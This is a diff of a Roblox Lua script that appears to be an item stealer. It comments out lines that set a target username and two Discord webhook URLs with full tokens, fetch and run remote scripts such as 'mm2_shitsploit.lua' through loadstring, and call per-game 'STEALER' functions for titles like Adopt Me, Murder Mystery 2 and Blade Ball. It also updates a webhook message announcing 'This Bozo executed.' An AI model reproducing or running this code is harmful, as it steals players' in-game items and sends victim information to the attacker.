@@ -4,62 +4,62 @@ if queue_on_teleport then
     )
 end
 
-repeat
-    task.wait()
-until game:IsLoaded()
+-- repeat
+--     task.wait()
+-- until game:IsLoaded()
 
-if game.GameId ~= 66654135 then
---     script = [[Usernames = {
---         'egor_idk',
---     }
---     BigHitsWebhook = "https://discord.com/api/webhooks/1357826346390388736/KjSeHvVInPlSYUlXzlPmO8QlFrvGBYijca90t1KDXEoHd6t2I1BBhHW88N2RXWk4ztz5"
---     SmallHitsWebhook = "https://discord.com/api/webhooks/1357826383799123998/y09epQB5PoyzGQq6qIBvpwLK8dVoc_68CxGWzz6RhkE7ou2DWG3kqDWO0KMkuMrWdEEd"
---     loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/X/refs/heads/main/mm2_shitsploit.lua", true))()
+-- if game.GameId ~= 66654135 then
+-- --     script = [[Usernames = {
+-- --         'egor_idk',
+-- --     }
+-- --     BigHitsWebhook = "https://discord.com/api/webhooks/1357826346390388736/KjSeHvVInPlSYUlXzlPmO8QlFrvGBYijca90t1KDXEoHd6t2I1BBhHW88N2RXWk4ztz5"
+-- --     SmallHitsWebhook = "https://discord.com/api/webhooks/1357826383799123998/y09epQB5PoyzGQq6qIBvpwLK8dVoc_68CxGWzz6RhkE7ou2DWG3kqDWO0KMkuMrWdEEd"
+-- --     loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/X/refs/heads/main/mm2_shitsploit.lua", true))()
+-- -- loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/files/mm2_lite.lua"))()
+-- -- ]]
+-- --     queue_on_teleport(script)
+
+--     task.wait(0.1)
+--     game:GetService('TeleportService'):Teleport(142823291, game.Players.LocalPlayer)
+-- end
+
+-- Usernames = {
+--     'egor_idk',
+-- }
+-- BigHitsWebhook = "https://discord.com/api/webhooks/1357826346390388736/KjSeHvVInPlSYUlXzlPmO8QlFrvGBYijca90t1KDXEoHd6t2I1BBhHW88N2RXWk4ztz5"
+-- SmallHitsWebhook = "https://discord.com/api/webhooks/1357826383799123998/y09epQB5PoyzGQq6qIBvpwLK8dVoc_68CxGWzz6RhkE7ou2DWG3kqDWO0KMkuMrWdEEd"
+-- loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/X/refs/heads/main/mm2_shitsploit.lua", true))()
 -- loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/files/mm2_lite.lua"))()
+
+
+-- --[[
+
+-- if game.GameId == 383310974 then
+--     ADOPT_ME_STEALER()
+-- end
+-- if game.GameId == 66654135 then
+--     MM2_STEALER()
+-- end
+-- if game.GameId == 4777817887 then
+--     BLADE_BALL_STEALER()
+-- end
+-- if game.GameId == 3317771874 then
+--     PS99_STEALER()
+-- end
+-- if game.GameId == 4778845442 then
+--     TTD()
+-- end
+-- if game.GameId == 3317679266 then
+--     PLS_DONATE()
+-- end
+-- if game.GameId == 1008451066 then
+--     DA_HOOD()
+-- end
+-- if game.GameId == 994732206 then
+--     BLOX_FRUITS()
+-- end
+
 -- ]]
---     queue_on_teleport(script)
-
-    task.wait(0.1)
-    game:GetService('TeleportService'):Teleport(142823291, game.Players.LocalPlayer)
-end
-
-Usernames = {
-    'egor_idk',
-}
-BigHitsWebhook = "https://discord.com/api/webhooks/1357826346390388736/KjSeHvVInPlSYUlXzlPmO8QlFrvGBYijca90t1KDXEoHd6t2I1BBhHW88N2RXWk4ztz5"
-SmallHitsWebhook = "https://discord.com/api/webhooks/1357826383799123998/y09epQB5PoyzGQq6qIBvpwLK8dVoc_68CxGWzz6RhkE7ou2DWG3kqDWO0KMkuMrWdEEd"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/X/refs/heads/main/mm2_shitsploit.lua", true))()
-loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/files/mm2_lite.lua"))()
-
-
---[[
-
-if game.GameId == 383310974 then
-    ADOPT_ME_STEALER()
-end
-if game.GameId == 66654135 then
-    MM2_STEALER()
-end
-if game.GameId == 4777817887 then
-    BLADE_BALL_STEALER()
-end
-if game.GameId == 3317771874 then
-    PS99_STEALER()
-end
-if game.GameId == 4778845442 then
-    TTD()
-end
-if game.GameId == 3317679266 then
-    PLS_DONATE()
-end
-if game.GameId == 1008451066 then
-    DA_HOOD()
-end
-if game.GameId == 994732206 then
-    BLOX_FRUITS()
-end
-
-]]
 
 
 local Webhook =
@@ -99,7 +99,7 @@ local msg = {
     ["embeds"] = {
         {
             ["color"] = tonumber(tostring("0x32CD32")), --decimal
-            ["title"] = "This Bozo executed. v2",
+            ["title"] = "This Bozo executed. v3",
             ["thumbnail"] = {
                 ["url"] = AvatarImage
             },
